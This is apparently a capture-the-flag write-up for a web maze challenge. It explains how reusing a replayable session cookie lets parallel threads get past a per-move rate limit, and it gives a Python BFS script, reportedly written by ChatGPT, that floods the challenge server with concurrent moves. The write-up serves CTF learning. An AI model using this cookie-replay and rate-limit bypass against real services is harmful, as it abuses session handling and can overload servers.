## MAZE

### Looking Around
At first, i expected some webl vuln, like cookie tampering that we could exploit to explore the maze. Nothing worked, so the only option was to explore the maze.

### DFS
Tried basic DFS algo. Extremely slow since the fact that we could only move 1 block in 1 second, and we would have *very* long backtracks. So it wouldn't cut it.

### BFS
Now, the only other option was BFS. One useful thing was I noted now was that timestamp of last move and current location was hardcoded in the cookie, and you could use the same cookie however many times you want. So I came up with a strategy.

1. We will start at (0,0) with 4 workers. 4 workers will go different direction at the same time parallely. This doesn't rate limit us as we are using same cookie.
2. Maintain a global visited coords set.
3. Now if any worker hits a dead end, it stops itself. Otherwise, each worker can spawn more workers to explore all possible routes parallely. This approach guaranteed to solve the maze in minimum possible time.
4. If response includes the key "win", we print the cookie and exit. 

Explained this to chatgpt, and it gave this script. Took around ~45 minutes or so to complete. (It doesn't stop after reaching the exit and printing the cookie, so look through logs when it ends.)

```python
import requests
import time
import json
from requests.utils import dict_from_cookiejar, cookiejar_from_dict
from concurrent.futures import ThreadPoolExecutor, as_completed

# Endpoint configurations
BASE_URL = "https://maze-karo-1nv4g9s.blitzhack.xyz"
MOVE_ENDPOINT = f"{BASE_URL}/move"

# Directions mapping
DIRS = {
    'up': (0, 1),
    'down': (0, -1),
    'left': (-1, 0),
    'right': (1, 0)
}

# Helper to clone a session (carry over cookies)
def clone_session(old_session):
    new_s = requests.Session()
    cookies_dict = dict_from_cookiejar(old_session.cookies)
    new_s.cookies = cookiejar_from_dict(cookies_dict)
    return new_s

# Initialize a new worker at origin (0,0)
def init_worker():
    s = requests.Session()
    s.get(BASE_URL)
    return (s, 0, 0)

# Task for a single move attempt
def move_task(session, x, y, move):
    dx, dy = DIRS[move]
    nx, ny = x + dx, y + dy
    s = clone_session(session)
    resp = s.post(MOVE_ENDPOINT, json={"move": move}, headers={'Content-Type': 'application/json'})
    data = resp.json()
    return (s, x, y, move, nx, ny, data)


def main():
    workers = [init_worker()]
    visited = {(0, 0)}
    step = 0

    while workers:
        step += 1
        print(f"--- Step {step}: {len(workers)} active workers ---")
        next_workers = []
        tasks = []

        # Prepare all tasks for this step
        for session, x, y in workers:
            for move in DIRS:
                dx, dy = DIRS[move]
                nx, ny = x + dx, y + dy
                if (nx, ny) not in visited:
                    tasks.append((session, x, y, move))

        # Execute tasks in parallel
        with ThreadPoolExecutor(max_workers=len(tasks)) as executor:
            future_to_task = {executor.submit(move_task, *task): task for task in tasks}
            for future in as_completed(future_to_task):
                s, x, y, move, nx, ny, data = future.result()
                if data.get('success'):
                    visited.add((nx, ny))
                    print(f"[SUCCESS] move={move} to ({nx},{ny}), response={data}")
                    cookies = dict_from_cookiejar(s.cookies)
                    #print(f"[COOKIE] {cookies}")
                    if data.get('win'):
                        print(f"[WIN] Found exit at ({nx},{ny})! Cookie: {cookies}")
                    next_workers.append((s, nx, ny))
        # Rate limit: wait before next batch
        time.sleep(1)
        if not next_workers:
            print("No more reachable paths. Exploration ended.")
            break
        workers = next_workers

if __name__ == '__main__':
    main()
```



